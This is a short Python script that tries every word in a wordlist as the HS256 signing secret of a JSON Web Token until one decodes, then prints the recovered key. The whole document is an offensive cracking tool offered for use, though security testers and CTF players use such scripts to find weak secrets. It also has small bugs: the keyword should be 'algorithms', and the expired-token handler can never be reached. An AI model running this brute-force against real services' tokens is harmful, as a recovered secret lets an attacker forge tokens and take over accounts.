#!/usr/bin/python
# Short script that tries a wordlist to guess JWT secret key

# pip install pyjwt
import jwt

print("Script to brute-force JWT secret key")
encoded = input("Enter encoded payload: ")
filename = input("Enter wordlist: ")

with open(filename) as secrets:
    for secret in secrets:
        try:
            payload = jwt.decode(encoded, secret.rstrip(), algorithm= 'HS256')
            print("Success! Token decoded with ... [" + secret.rstrip() + "]")
            break
        except jwt.InvalidTokenError:
            print("Invalid Token ... [" + secret.rstrip() + "]")
        except jwt.ExpiredSignatureError:
            print("Token Expired ... [" + secret.rstrip() + "]")
